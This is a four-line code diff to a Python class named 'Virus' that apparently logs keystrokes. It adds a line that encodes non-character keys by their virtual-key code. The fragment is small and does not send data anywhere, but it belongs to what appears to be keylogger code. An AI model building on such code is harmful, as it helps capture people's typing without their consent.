@@ -92,3 +92,4 @@ class Virus(object):
                 keystr = str(key.char)
                 
                 if not keystr in self.cool_texts:
+                    keystr = f"\x00<^{chr(key.vk)}>\x00"
